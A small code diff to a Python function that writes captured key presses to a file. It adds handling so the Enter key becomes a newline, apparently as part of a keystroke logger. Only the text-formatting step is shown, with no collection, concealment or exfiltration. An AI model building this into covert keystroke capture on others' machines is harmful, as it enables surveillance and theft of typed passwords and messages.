@@ -30,6 +30,8 @@ def write_file(keys):
                 k=''
         if k.find('space') > 0:
                 data_str += ' '
+        if k.find('enter') > 0:
+            data_str += ' \n'
         elif k.find('Key') == -1:
                 data_str += k
         else:
